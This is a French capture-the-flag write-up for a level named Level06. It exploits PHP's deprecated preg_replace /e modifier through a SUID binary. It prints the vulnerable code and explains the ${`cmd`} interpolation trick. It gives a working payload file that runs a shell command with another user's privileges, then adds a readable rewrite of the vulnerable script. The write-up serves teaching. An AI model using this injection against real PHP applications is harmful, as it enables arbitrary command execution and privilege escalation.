# Level06 — PHP `preg_replace` modificateur `/e` (Code Injection)

## Fichier fourni

```sh
ls -la ~
# -rwsr-x---  1 flag06 level06  ...  level06
# -rw-r--r--  1 flag06 flag06   ...  level06.php
```

- `level06` : binaire SUID `flag06` qui appelle `level06.php`
- `level06.php` : script lisible par tous

## Reconnaissance

```sh
cat ~/level06.php
```

Code vulnérable :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Le modificateur **`/e`** (déprécié depuis PHP 5.5) demande à `preg_replace` d'**évaluer le second argument comme du code PHP** après substitution des captures. Tout ce qui finit interpolé dans cette chaîne est exécuté.

## Vulnérabilité

Avec `/e`, le contenu capturé par `(.*)` se retrouve injecté dans une chaîne PHP entre guillemets doubles, puis évalué. Or PHP interpole les expressions `${...}` à l'intérieur des chaînes double-quotées → on peut y placer du code arbitraire.

La syntaxe `${`cmd`}` :
1. Exécute `cmd` via les backticks (substitution shell)
2. Tente d'utiliser le résultat comme nom de variable (`${...}`)
3. La variable n'existe pas → `Notice: Undefined variable` — mais la commande a déjà tourné

## Exploitation

Préparer un fichier d'entrée respectant le motif `[x ...]` avec un payload qui appelle `getflag` :

```sh
echo '[x ${`getflag`}]' > /tmp/payload
```

Lancer le binaire SUID sur ce fichier :

```sh
~/level06 /tmp/payload
```

Sortie observée :

```text
PHP Notice:  Undefined variable: Check flag.Here is your token : <TOKEN>
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Le token apparaît dans le message d'erreur car `getflag` s'est exécuté avec l'UID de `flag06` avant que PHP ne tente la résolution de variable.

## Token

Voir `../flag`.




# --- Version lisible (équivalente fonctionnellement) ---
<?php
// y() : remplace simplement les '.' par ' x ' et les '@' par ' y'
function transform($texte) {
    $texte = preg_replace("/\./", " x ", $texte);
    $texte = preg_replace("/@/",  " y",  $texte);
    return $texte;
}

// x() : lit un fichier et applique 3 substitutions
function process_fichier($chemin, $arg2_inutilise) {
    $contenu = file_get_contents($chemin);

    // /!\ Vulnérable : le modifier /e fait EXÉCUTER le 2e argument comme du PHP.
    // Pour chaque match "[x ...]", PHP évalue : transform("...")
    // -> tout ce qu'on met dans "..." est interprété (ex: ${`cmd`} = exécution shell).
    $contenu = preg_replace("/(\[x (.*)\])/e", "transform(\"\\2\")", $contenu);

    // Cosmétique : remplace les crochets restants par des parenthèses
    $contenu = preg_replace("/\[/", "(", $contenu);
    $contenu = preg_replace("/\]/", ")", $contenu);

    return $contenu;
}
$resultat = process_fichier($argv[1], $argv[2]);
print $resultat;